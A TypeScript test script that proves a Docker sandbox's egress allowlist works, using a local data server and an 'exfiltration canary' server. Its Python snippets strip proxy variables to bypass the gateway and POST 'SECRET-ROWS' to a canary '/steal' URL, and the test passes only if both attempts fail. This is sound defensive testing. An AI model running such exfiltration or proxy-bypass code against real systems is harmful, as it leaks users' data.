/**
 * Egress-allowlist proof (lib/sandbox/egress.ts) — real containers, real
 * internal network, real proxy. Run: npx tsx scripts/egress-proof.ts
 *
 * A local HTTP server plays the "bucket". Three assertions:
 *   1. ALLOWED : python urllib AND DuckDB read the origin through the
 *                gateway (urllib via proxy env; DuckDB via the prelude's
 *                connect patch — the exact mechanisms remote analyses use).
 *   2. BLOCKED : the same fetch with the origin NOT on the allowlist fails
 *                (proxy 403), proving deny-by-default.
 *   3. NO ROUTE: a direct fetch bypassing the proxy fails, proving the
 *                internal network really has no way out.
 *
 * Then the EXFILTRATION CANARY (continuous version of the manual
 * webhook.site check): a second local origin that must NEVER receive a
 * request from sandboxed code. A positive control first proves the canary is
 * genuinely reachable from an ordinary container — so later silence means
 * "blocked", not "unreachable anyway". Then:
 *   4. deny-mode code (host-authored, run_analysis policy) tries to POST to
 *      it — canary must stay silent.
 *   5. allowlisted networked code (the analyze/prompt-injection path) reads
 *      its permitted origin AND tries to exfiltrate to the canary — the read
 *      works, the canary stays silent.
 */
import { createServer } from "node:http";
import { installEnvConfig } from "@/harness/env-config";

installEnvConfig("snapshot");

const PORT = 18923;
const CANARY_PORT = 18924;
const ORIGIN_HOST = "host.docker.internal";

function fail(msg: string): never {
  console.error(`✖ ${msg}`);
  process.exit(1);
}

async function main(): Promise<void> {
  const { executeSandbox } = await import("@/lib/sandbox");
  const { run } = await import("@/lib/sandbox/docker-utils");
  const { DOCKER_SANDBOX_IMAGE } = await import("@/lib/constants");

  const server = createServer((_req, res) => {
    res.writeHead(200, { "Content-Type": "text/csv" });
    res.end("k,v\nalpha,1\nbeta,2\n");
  });
  await new Promise<void>((r) => server.listen(PORT, "0.0.0.0", r));

  // The canary: any request here is a successful exfiltration.
  let canaryHits = 0;
  const canaryBodies: string[] = [];
  const canary = createServer((req, res) => {
    canaryHits++;
    let body = "";
    req.on("data", (c) => (body += String(c)));
    req.on("end", () => {
      canaryBodies.push(body.slice(0, 200));
      res.writeHead(200);
      res.end("ok");
    });
  });
  await new Promise<void>((r) => canary.listen(CANARY_PORT, "0.0.0.0", r));

  // Reachable-by-IP from containers on the default bridge (hostnames would be
  // denied by the allowlist before DNS, which would make silence meaningless).
  const bridgeGateway = (
    await run("docker", [
      "network",
      "inspect",
      "bridge",
      "--format",
      "{{(index .IPAM.Config 0).Gateway}}",
    ])
  ).stdout.trim();
  const canaryUrl = `http://${bridgeGateway}:${CANARY_PORT}/steal`;

  const fetchCode = `
results = {}
chart_data = {}
import os, urllib.request, duckdb
url = "http://${ORIGIN_HOST}:${PORT}/data.csv"
body = urllib.request.urlopen(url, timeout=20).read().decode()
results["urllib_bytes"] = len(body)
rows = duckdb.connect().execute("SELECT count(*) FROM read_csv('" + url + "')").fetchone()[0]
results["duckdb_rows"] = int(rows)
write_output(results, chart_data)
`;

  try {
    // 1. Allowed
    const allowed = await executeSandbox("a\n1\n", fetchCode, {
      runtime: "docker",
      allowedEgressHosts: [ORIGIN_HOST],
    });
    if (!allowed.success) fail(`allowed run failed: ${(allowed as { error: string }).error}`);
    const r = allowed.results as { urllib_bytes: number; duckdb_rows: number };
    if (r.urllib_bytes < 10) fail("urllib fetch through proxy returned nothing");
    if (r.duckdb_rows !== 2) fail(`duckdb through proxy read ${r.duckdb_rows} rows, wanted 2`);
    console.error(
      `✔ allowed origin readable: urllib ${r.urllib_bytes}B, duckdb ${r.duckdb_rows} rows`
    );

    // 2. Blocked by allowlist
    const blocked = await executeSandbox("a\n1\n", fetchCode, {
      runtime: "docker",
      allowedEgressHosts: ["some.other.host.example"],
    });
    if (blocked.success) fail("fetch to non-allowlisted origin SUCCEEDED — allowlist not enforced");
    console.error("✔ non-allowlisted origin blocked by proxy");

    // 3. No route without the proxy (internal network truly sealed)
    const direct = await executeSandbox(
      "a\n1\n",
      `
results = {}
chart_data = {}
import os, urllib.request
for k in ("HTTP_PROXY","HTTPS_PROXY","http_proxy","https_proxy"):
    os.environ.pop(k, None)
body = urllib.request.urlopen("http://${ORIGIN_HOST}:${PORT}/data.csv", timeout=10).read()
results["direct"] = len(body)
write_output(results, chart_data)
`,
      { runtime: "docker", allowedEgressHosts: [ORIGIN_HOST] }
    );
    if (direct.success)
      fail("direct (proxy-bypassing) fetch SUCCEEDED — internal net has a route out");
    console.error("✔ proxy bypass impossible — internal network has no route");

    // ── Positive control: the canary IS reachable from a normal container ──
    await run("docker", [
      "run",
      "--rm",
      DOCKER_SANDBOX_IMAGE,
      "python3",
      "-c",
      `import urllib.request; urllib.request.urlopen("${canaryUrl}", data=b"control", timeout=10).read()`,
    ]);
    if (canaryHits !== 1) {
      fail(
        `canary positive control failed (${canaryHits} hits) — later silence would be meaningless`
      );
    }
    console.error("✔ canary reachable from an unrestricted container (control)");

    const exfilCode = (extra: string) => `
results = {}
chart_data = {}
import urllib.request
${extra}
try:
    urllib.request.urlopen("${canaryUrl}", data=b"SECRET-ROWS", timeout=10).read()
    results["exfil"] = "SUCCEEDED"
except Exception as e:
    results["exfil"] = "blocked"
write_output(results, chart_data)
`;

    // ── 4. Host-authored code under deny: no network at all ──
    const denyRun = await executeSandbox("a\n1\n", exfilCode(""), {
      runtime: "docker",
      network: "deny",
    });
    const denyExfil = denyRun.success
      ? (denyRun.results as { exfil?: string }).exfil
      : "run-failed";
    if (denyExfil === "SUCCEEDED" || canaryHits !== 1) {
      fail(`EXFILTRATION under network=deny (${canaryHits - 1} hits, exfil=${denyExfil})`);
    }
    console.error(`✔ canary silent under network=deny (exfil ${denyExfil})`);

    // ── 5. Allowlisted networked code: reads its origin, cannot exfiltrate ──
    const injectRun = await executeSandbox(
      "a\n1\n",
      exfilCode(
        `body = urllib.request.urlopen("http://${ORIGIN_HOST}:${PORT}/data.csv", timeout=20).read()\nresults["read_bytes"] = len(body)`
      ),
      { runtime: "docker", allowedEgressHosts: [ORIGIN_HOST] }
    );
    if (!injectRun.success)
      fail(`allowlisted run failed: ${(injectRun as { error: string }).error}`);
    const inj = injectRun.results as { exfil?: string; read_bytes?: number };
    if (inj.exfil === "SUCCEEDED" || canaryHits !== 1) {
      fail(`EXFILTRATION through the allowlisted proxy (${canaryHits - 1} hits)`);
    }
    if (!inj.read_bytes) fail("allowlisted origin read returned nothing");
    console.error(
      `✔ canary silent through the proxy while the allowed origin read ${inj.read_bytes}B`
    );
    if (canaryBodies.some((b) => b.includes("SECRET-ROWS"))) {
      fail("canary received sandbox payload");
    }
  } finally {
    server.close();
    canary.close();
  }

  console.error("Egress proof ok.");
  process.exit(0);
}

main().catch((err) => {
  console.error("egress-proof:", err instanceof Error ? err.message : err);
  process.exit(1);
});
